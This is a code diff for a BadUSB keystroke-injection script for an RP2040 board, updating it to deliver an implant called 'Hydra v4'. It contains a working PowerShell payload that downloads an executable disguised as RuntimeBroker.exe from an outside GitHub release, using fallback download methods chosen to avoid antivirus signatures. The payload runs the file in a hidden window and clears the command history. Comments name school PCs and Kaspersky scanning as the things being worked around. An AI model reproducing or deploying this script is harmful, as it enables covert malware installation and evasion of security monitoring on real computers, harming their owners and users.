@@ -1,15 +1,9 @@
-# BadUSB v3 — RP2040 BOOT+RESET Board
-# Plug → enumerate HID → neutralize Caps Lock → PowerShell → download + execute implant
+# BadUSB v4 — Hydra delivery
+# Plug → enumerate HID → kill Caps Lock → PS → download Hydra v4 → execute
 #
-# v3 CHANGES from v2 (based on adversarial analysis):
-# - Caps Lock neutralized BEFORE any typing (was 82% corruption bug)
-# - iwr → WebClient → bitsadmin fallback chain (certutil was signatured LOLBin)
-# - Retry loop in PS (6 attempts × 3s = 18s coverage)
-# - Start-Process -WindowStyle Hidden + exit (was bare Start-Process)
-# - LED error signal: fast blink = download failed
-# - ENUM_WAIT 5s → 8s (Kaspersky USB scanning on school PCs)
-# - v3.1: payload blasts at max speed (write() handles char sequencing).
-#   Per-char delays removed — 22s visible typing was too slow.
+# v4: downloads RuntimeBroker.exe (Hydra v4) from latest GitHub Release.
+#     v3.1 speed optimizations retained — payload blasts via write().
+#     ENUM_WAIT 8s for school PC + Kaspersky USB scanning.
 
 import time
 import board
@@ -30,7 +24,8 @@ def pulse(n=1, fast=False):
         led.value = False; time.sleep(d)
 
 # ── CONFIG ─────────────────────────────────────────────
-EXE_URL = "https://github.com/vLoon-jpg/edu-virus/releases/latest/download/svchost.exe"
+EXE_URL = "https://github.com/vLoon-jpg/edu-virus/releases/latest/download/RuntimeBroker.exe"
+EXE_NAME = "RuntimeBroker.exe"
 ENUM_WAIT = 8.0  # school PC + Kaspersky USB scanning
 PS_WAIT = 4.0    # time for PowerShell to open
 # ────────────────────────────────────────────────────────
@@ -79,13 +74,12 @@ pulse(2)  # PS launched
 time.sleep(PS_WAIT)
 
 # ═══ PHASE 3: Type the payload ════════════════════════
-# Retry loop + three download methods + hidden window + cleanup.
-# WebClient fallback instead of certutil (certutil is a known LOLBin).
-# bitsadmin as third fallback (ships with Win10, less signatured).
+# Downloads RuntimeBroker.exe (Hydra v4) with triple fallback.
+# iwr → WebClient → bitsadmin. 6 retries × 3s each.
 
 PAYLOAD = (
     "$u='{URL}';"
-    "$p=\"$env:TEMP\\svchost.exe\";"
+    "$p=\"$env:TEMP\\{NAME}\";"
     "for($i=0;$i -lt 6 -and !(Test-Path $p);$i++){{"
     "try{{iwr -Uri $u -OutFile $p -UseBasicParsing}}catch{{}};"
     "if(!(Test-Path $p)){{try{{(New-Object Net.WebClient).DownloadFile($u,$p)}}catch{{}}}};"
@@ -96,7 +90,7 @@ PAYLOAD = (
     "sleep 2;"
     "try{{[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()}}catch{{}};"
     "exit"
-).format(URL=EXE_URL)
+).format(URL=EXE_URL, NAME=EXE_NAME)
 
 # Blast the payload — max speed. The write() method handles
 # character sequencing internally. No need for per-char delays.
